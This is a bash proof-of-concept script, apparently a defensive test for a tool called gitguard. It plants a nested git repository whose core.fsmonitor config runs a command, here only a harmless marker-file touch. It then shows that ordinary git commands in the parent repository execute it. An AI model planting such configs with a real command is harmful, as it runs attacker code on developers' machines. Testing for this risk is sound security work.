#!/bin/bash
# Proof: a nested repository `vendor/.git` (a directory, not declared in
# .gitmodules) IS a threat to the root repository, contrary to what a first
# analysis concluded. As soon as a gitlink for `vendor` exists in the index —
# which an ordinary `git add -A` by the user creates if the nested repository
# has at least one commit — git opens `vendor/.git/config` and honours its
# keys from the root. The container only needs to write into the tree.
#
# The mistake of the first proof: it created `vendor` with `git init` without
# a commit. `git add -A` then records no gitlink, and the check "foo is
# indexed as a gitlink" sat behind a `grep -q … && echo`, hence silently
# skipped. Lesson: never put an assertion behind &&.
#
# Also checks that the FIRST `git add -A` (the one creating the gitlink)
# executes nothing by itself: this is what makes GITGUARD_SCAN_TREE=0
# acceptable (gitguard reads the index gitlinks before every command, and so
# refuses the command that follows the add). If a git version changes this,
# this script fails and the option must be removed.
set -u
T=$(mktemp -d); trap 'rm -rf "$T"' EXIT
export HOME=$T/h GIT_CONFIG_NOSYSTEM=1; mkdir -p "$HOME"
git config --global user.email t@t; git config --global user.name t
MARK=$T/EXEC

cd "$T"; git init -q root; cd root; echo a > a; git add a; git commit -qm init

# the container: a nested repository with one commit and a config that executes
mkdir vendor; git init -q vendor
(cd vendor && echo v > v && git add v && git commit -qm v) >/dev/null
git -C vendor config core.fsmonitor "sh -c 'touch $MARK; exit 1'"

ran() { rm -f "$MARK"; "$@" >/dev/null 2>&1; [ -e "$MARK" ] && echo EXECUTED || echo "not executed"; }

echo "Before any gitlink (index without a 160000 entry):"
echo "  status: $(ran git status --short)"

echo "The user runs an ordinary 'git add -A':"
r=$(ran git add -A); echo "  add -A itself: $r"
if [ "$r" = EXECUTED ]; then
  echo "  WARNING: git executes the nested config on the first add -A already." \
       "GITGUARD_SCAN_TREE=0 (which only refuses the next command) is no longer safe."
  exit 1
fi
gitlink=$(git ls-files --stage | awk '$1=="160000"{print $4}')
if [ -z "$gitlink" ]; then echo "  PROOF INVALIDATED: no gitlink created"; exit 1; fi
echo "  index: gitlink 160000 for '$gitlink'"

echo "From here on, from the ROOT:"
fail=0
for c in "status --short" "diff" "add -A" "commit -qm x"; do
  r=$(ran git $c); echo "  git $c: $r"
  [ "$r" = EXECUTED ] && fail=1
done
[ $fail -eq 1 ] && echo "PROOF OK: the nested repository executes code from the root → gitguard must refuse" \
               || { echo "PROOF INVALIDATED: git no longer executes the nested repository's config"; exit 1; }
